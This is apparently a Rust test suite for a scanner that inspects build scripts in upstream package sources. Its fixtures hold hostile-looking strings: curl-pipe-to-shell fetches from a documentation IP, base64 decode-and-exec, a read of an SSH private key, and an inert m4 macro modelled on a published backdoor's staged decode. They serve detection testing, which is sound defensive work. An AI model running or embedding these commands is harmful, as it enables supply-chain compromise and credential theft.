// SPDX-License-Identifier: GPL-2.0-or-later
//! Build scripts inside upstream source, per language. Everything here is read, never run.
use aurlaws::{Evidence, LawId as L, upstream};
use std::collections::HashMap;
use std::path::PathBuf;

const QUIET: &str = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\nurl=https://example.org\n";

fn tree(name: &str, files: &[(&str, &str)]) -> PathBuf {
    let d = std::env::temp_dir().join(format!("aurlaws-up-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    for (p, t) in files {
        let f = d.join(p);
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(f, t).unwrap();
    }
    d
}

fn laws(name: &str, files: &[(&str, &str)]) -> Vec<L> {
    let d = tree(name, files);
    let scan = upstream::scan(&d, &upstream::Options::default());
    let ev = Evidence {
        upstream: vec![scan.graph],
        ..Evidence::default()
    };
    let r = aurlaws::judge_with(QUIET, &HashMap::new(), &ev);
    let mut v: Vec<L> = r.findings.iter().map(|f| f.law).collect();
    v.sort();
    v.dedup();
    v
}

#[test]
fn each_language_is_read() {
    let rows: &[(&str, &str, &str, &[L])] = &[
        (
            "py_decode",
            "setup.py",
            "import base64\nexec(base64.b64decode('aGk='))\n",
            &[L::DecodeExecute],
        ),
        (
            "py_decode_var",
            "setup.py",
            "import base64\nx = base64.b64decode(blob)\nexec(x)\n",
            &[L::DecodeExecute],
        ),
        (
            "py_fetch",
            "setup.py",
            "import os\nos.system('curl -s http://203.0.113.9/x | sh')\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "py_urlopen",
            "setup.py",
            "import urllib.request as u\nexec(u.urlopen('http://203.0.113.9/x').read())\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "py_secret",
            "setup.py",
            "import os\nd = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
            &[L::ReadCredentials],
        ),
        (
            "py_version",
            "setup.py",
            "exec(open('demo/version.py').read())\nsetup(name='demo')\n",
            &[],
        ),
        (
            "py_plain",
            "setup.py",
            "from setuptools import setup\nsetup(name='demo', version='1')\n",
            &[],
        ),
        (
            "py_dynamic",
            "setup.py",
            "exec(compute())\n",
            &[L::UnresolvedDynamic],
        ),
        (
            "js_exec",
            "scripts/postinstall.js",
            "require('child_process').execSync('curl -s http://203.0.113.9/x | sh')\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "js_decode",
            "install.js",
            "eval(Buffer.from(blob, 'base64').toString())\n",
            &[L::DecodeExecute],
        ),
        (
            "rs_shell",
            "build.rs",
            "use std::process::Command;\nfn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl -s http://203.0.113.9/x | sh\").status().unwrap(); }\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "rs_plain",
            "build.rs",
            "fn main() { println!(\"cargo:rerun-if-changed=build.rs\"); }\n",
            &[],
        ),
        (
            "go_gen",
            "gen.go",
            "package main\n//go:generate sh -c \"curl -s http://203.0.113.9/x | sh\"\nfunc main() {}\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "go_exec",
            "tools/gen.go",
            "package main\nimport \"os/exec\"\nfunc main() { exec.Command(\"sh\", \"-c\", \"curl -s http://203.0.113.9/x | sh\").Run() }\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "c_system",
            "tools/gen.c",
            "int main(void) { system(\"curl -s http://203.0.113.9/x | sh\"); return 0; }\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "make",
            "Makefile",
            "all:\n\t@curl -s http://203.0.113.9/x | sh\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "make_shell",
            "Makefile",
            "X := $(shell base64 -d blob | sh)\nall:\n\ttrue\n",
            &[L::DecodeExecute],
        ),
        (
            "make_plain",
            "Makefile",
            "all:\n\t$(CC) -o demo demo.c\n",
            &[],
        ),
        (
            "cmake_exec",
            "CMakeLists.txt",
            "execute_process(COMMAND sh -c \"curl -s http://203.0.113.9/x | sh\")\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "cmake_download",
            "CMakeLists.txt",
            "file(DOWNLOAD http://203.0.113.9/x ${CMAKE_BINARY_DIR}/x.sh)\nexecute_process(COMMAND sh ${CMAKE_BINARY_DIR}/x.sh)\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "cmake_hash",
            "CMakeLists.txt",
            "file(DOWNLOAD http://203.0.113.9/x ${CMAKE_BINARY_DIR}/x.sh EXPECTED_HASH SHA256=00)\nexecute_process(COMMAND sh ${CMAKE_BINARY_DIR}/x.sh)\n",
            &[],
        ),
        (
            "npm_script",
            "package.json",
            "{\"name\":\"d\",\"scripts\":{\"postinstall\":\"curl -s http://203.0.113.9/x | sh\"}}\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "npm_plain",
            "package.json",
            "{\"name\":\"d\",\"scripts\":{\"test\":\"curl -s http://203.0.113.9/x | sh\"}}\n",
            &[],
        ),
        (
            "shell",
            "autogen.sh",
            "#!/bin/sh\ncurl -s http://203.0.113.9/x | sh\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "tool_script",
            "scripts/gen.sh",
            "curl -s http://203.0.113.9/x | sh\n",
            &[L::FetchExecuteUnverified],
        ),
        (
            "ci_script",
            ".github/workflows/x.sh",
            "curl -s http://203.0.113.9/x | sh\n",
            &[],
        ),
        (
            "ci_folder",
            "ci/x.sh",
            "curl -s http://203.0.113.9/x | sh\n",
            &[],
        ),
        (
            "test_script",
            "tests/x.sh",
            "curl -s http://203.0.113.9/x | sh\n",
            &[],
        ),
        (
            "runtime_script",
            "src/app/launch.sh",
            "curl -s http://203.0.113.9/x | sh\n",
            &[],
        ),
        (
            "command_in_a_variable",
            "autogen.sh",
            "$TOOL --flag\n\"$@\"\n",
            &[],
        ),
        ("eval_of_a_parameter", "configure", "eval \"$1\"\n", &[]),
        (
            "byte_swap_in_libtool",
            "aclocal.m4",
            "eval `echo $x | tr ab ba`\n",
            &[],
        ),
        (
            "still_flows",
            "configure",
            "curl -s http://203.0.113.9/x | eval \"$(cat)\"\n",
            &[L::FetchExecuteUnverified],
        ),
    ];
    for (name, path, text, want) in rows {
        assert_eq!(&laws(name, &[(path, text)]), want, "{name}");
    }
}

#[test]
fn application_code_is_not_a_build_script() {
    assert_eq!(
        laws(
            "app",
            &[(
                "src/net/client.py",
                "import os\nos.system('curl -s http://203.0.113.9/x | sh')\n"
            )]
        ),
        []
    );
}

#[test]
fn staged_decode_hidden_in_an_m4_macro() {
    // The shape of a published incident, inert: a macro keeps a pipeline in a string, and swaps bytes
    // with tr before the shell gets it.
    let m4 = "AC_DEFUN([gl_BUILD_TO_HOST], [\n  gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'\n  gl_config='sed \"r\\n\" tests/files/good.xz | eval $gl_path_map | xz -d'\n  eval $gl_config | $SHELL\n])\n";
    let got = laws("m4", &[("m4/build-to-host.m4", m4)]);
    assert!(got.contains(&L::DecodeExecute), "{got:?}");
}

#[test]
fn autotools_boilerplate_stays_quiet() {
    let conf = "#! /bin/sh\n# Generated by GNU Autoconf 2.72.\nac_ext=c\nac_compile='$CC -c conftest.$ac_ext'\nif { eval \"$ac_compile\"; }; then :; fi\neval ac_cv_foo=\\$ac_var\neval \"ac_res=\\$$3\"\n";
    assert_eq!(laws("configure", &[("configure", conf)]), []);
}

#[test]
fn a_second_scan_reuses_the_cache_and_a_changed_file_does_not() {
    let d = tree(
        "cache",
        &[
            ("setup.py", "exec(compute())\n"),
            ("build.rs", "fn main() {}\n"),
        ],
    );
    let cache = d.join(".cache-test");
    let o = upstream::Options {
        cache: Some(cache.clone()),
        ..upstream::Options::default()
    };
    let a = upstream::scan(&d, &o);
    assert_eq!((a.parsed, a.cached), (2, 0));
    let b = upstream::scan(&d, &o);
    assert_eq!((b.parsed, b.cached), (0, 2));
    assert_eq!(a.graph.nodes.len(), b.graph.nodes.len());
    std::fs::write(d.join("build.rs"), "fn main() { }\n").unwrap();
    let c = upstream::scan(&d, &o);
    assert_eq!((c.parsed, c.cached), (1, 1));
}

#[test]
fn hostile_trees_stay_bounded() {
    let big = "a".repeat(3_000_000);
    let deep = format!("{}x{}", "(".repeat(100_000), ")".repeat(100_000));
    let d = tree(
        "hostile",
        &[
            ("setup.py", &big),
            ("build.rs", &deep),
            ("Makefile", "\0\0\0"),
            ("package.json", "{not json"),
        ],
    );
    let s = upstream::scan(&d, &upstream::Options::default());
    assert!(s.skipped >= 1, "the oversized file is counted");
}

#[test]
fn a_scan_that_skips_files_says_so() {
    let d = tree("skip", &[("setup.py", &"# pad\n".repeat(600_000))]);
    let scan = upstream::scan(&d, &upstream::Options::default());
    let ev = Evidence {
        gaps: scan.gaps(),
        upstream: vec![scan.graph],
        ..Evidence::default()
    };
    let r = aurlaws::judge_with(QUIET, &HashMap::new(), &ev);
    assert!(
        r.findings.iter().any(|f| f.law == L::IncompleteEvidence),
        "{:#?}",
        r.findings
    );
}
